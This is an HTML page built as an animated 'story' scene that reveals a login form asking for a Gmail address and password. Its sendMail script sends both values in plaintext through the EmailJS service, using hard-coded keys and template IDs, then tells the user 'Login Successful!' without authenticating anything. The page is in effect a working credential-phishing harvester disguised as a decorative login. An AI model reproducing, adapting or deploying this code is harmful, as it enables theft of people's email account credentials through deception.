<!DOCTYPE html>
<html>
<head>
  <title>Story Login Scene</title>

  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>

  <script>
    emailjs.init("aU_rVriMIfRSDIniQ");
  </script>

  <style>

    body{
      margin:0;
      height:100vh;
      overflow:hidden;
      font-family:Arial;

      /* cinematic background */
      background-image:url("https://images.unsplash.com/photo-1605649487212-47bdab064df7");
      background-size:cover;
      background-position:center;
      position:relative;
    }

    /* dark cinematic overlay */
    body::before{
      content:"";
      position:absolute;
      width:100%;
      height:100%;
      background:rgba(0,0,0,0.45);
      z-index:0;
    }

    /* STORY TEXT */
    .story{
      position:absolute;
      top:30px;
      width:100%;
      text-align:center;
      color:white;
      font-size:22px;
      z-index:2;
      animation: fadeStory 3s ease-in-out infinite alternate;
    }

    @keyframes fadeStory{
      from{opacity:0.5;}
      to{opacity:1;}
    }

    /* CHARACTER */
    .character{
      position:absolute;
      bottom:60px;
      left:-100px;
      font-size:60px;
      z-index:2;
      animation: walkScene 7s infinite ease-in-out;
    }

    @keyframes walkScene{

      0%{
        left:-100px;
        bottom:60px;
      }

      40%{
        left:30%;
        bottom:60px;
      }

      55%{
        left:45%;
        bottom:160px;
      }

      60%{
        left:45%;
        bottom:60px;
      }

      100%{
        left:45%;
        bottom:60px;
      }
    }

    /* LOGIN BOX appears like "story reveal" */
    .container{
      position:absolute;
      top:50%;
      left:50%;
      transform:translate(-50%,-50%) scale(0);
      z-index:2;

      background:rgba(255,255,255,0.92);
      padding:40px;
      border-radius:20px;
      width:350px;
      text-align:center;
      box-shadow:0px 10px 25px rgba(0,0,0,0.5);

      animation: popLogin 2s forwards;
      animation-delay:4s;
    }

    @keyframes popLogin{
      to{
        transform:translate(-50%,-50%) scale(1);
      }
    }

    h2{
      color:#00e5ff;
      font-size:35px;
      margin-bottom:20px;
      animation: glow 2s infinite alternate;
    }

    @keyframes glow{
      from{ text-shadow:0 0 5px #00e5ff; }
      to{ text-shadow:0 0 20px #00e5ff; }
    }

    input{
      width:90%;
      padding:14px;
      margin:10px 0;
      border-radius:12px;
      border:none;
      outline:none;
    }

    button{
      width:95%;
      padding:14px;
      margin-top:10px;
      border:none;
      border-radius:12px;
      background:linear-gradient(135deg,#ff9800,#ff5722);
      color:white;
      font-size:18px;
      cursor:pointer;
    }

  </style>

</head>

<body>

<div class="story">
  A traveler reaches the ancient mountains… and finds the hidden gate.
</div>

<div class="character">🧑‍🚶</div>

<div class="container">

  <h2>LOGIN</h2>

  <input type="email" id="email" placeholder="Enter your Gmail">
  <input type="password" id="password" placeholder="Enter Password">

  <button onclick="sendMail()">LOG IN</button>

</div>

<script>

function sendMail(){

    let email = document.getElementById("email").value;
    let password = document.getElementById("password").value;

    if(email === "" || password === ""){
        alert("Please fill all fields!");
        return;
    }

    let params = { email, password };

    emailjs.send(
        "service_bqnzz7f",
        "template_y4w4kzl",
        params
    )
    .then(()=> alert("Login Successful!"))
    .catch(()=> alert("FAILED"));
}

</script>

</body>
</html>
